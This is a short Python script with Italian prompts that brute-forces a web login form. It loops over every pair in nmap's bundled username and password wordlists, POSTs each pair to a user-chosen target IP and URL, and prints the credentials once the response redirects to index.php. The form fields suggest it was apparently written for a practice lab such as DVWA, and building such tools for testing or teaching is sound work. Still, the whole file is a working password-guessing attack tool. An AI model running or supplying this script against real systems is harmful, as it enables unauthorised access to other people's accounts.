import http.client, urllib.parse

username_file = open('/usr/share/nmap/nselib/data/usernames.lst')
password_file = open('/usr/share/nmap/nselib/data/passwords.lst')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

Target = input('Inserisci IP della sistema Target: ')
url = input('Inserisci il url da attacare: ')
for user in  user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()

        print (user,"-",pwd)

        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,"Login": 'Submit'})
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        conn = http.client.HTTPConnection(Target,80)
        conn.request('POST', url,post_parameters, headers)
        response = conn.getresponse()
        print(response.status)

        if(response.getheader('location') == "index.php"):
            print("Logged with:",user," - ",pwd)
            exit()
